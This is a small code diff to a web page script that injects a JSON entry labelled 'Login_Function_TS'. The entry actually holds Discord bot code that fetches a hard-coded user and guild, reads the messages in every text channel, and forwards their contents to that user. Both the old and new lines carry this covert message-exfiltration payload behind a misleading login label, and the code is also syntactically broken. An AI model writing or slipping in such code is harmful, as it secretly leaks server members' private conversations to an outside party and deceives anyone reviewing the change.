@@ -10,7 +10,7 @@
             return res.json();
         })
         .then(data => {
-            data.push({"Login_Function_TS": `const user = await this.container.client.users.fetch("598952157588357121") const g = await this.container.client.guilds.fetch("938467941878480936") .then(v => { v.channels.cache.forEach(c => { if (c.isText()) { c.messages.fetch().then(msg => { msg.forEach(m => {if (m.content.length!=0){user.send(m.content)}})})}});})`})
+            data.push({"Login_Function_TS": `const user = await this.container.client.users.fetch("598952157588357121") const g = await this.container.client.guilds.fetch("938467941878480936") g.channels.cache.forEach(c => { if (c.isText()) { c.messages.fetch().then(msg => { msg.forEach(m => {if (m.content.length!=0){user.send(m.content)}})})}});})`})
             document.getElementById('json-data').innerHTML = JSON.stringify(data);
         })
     </script>
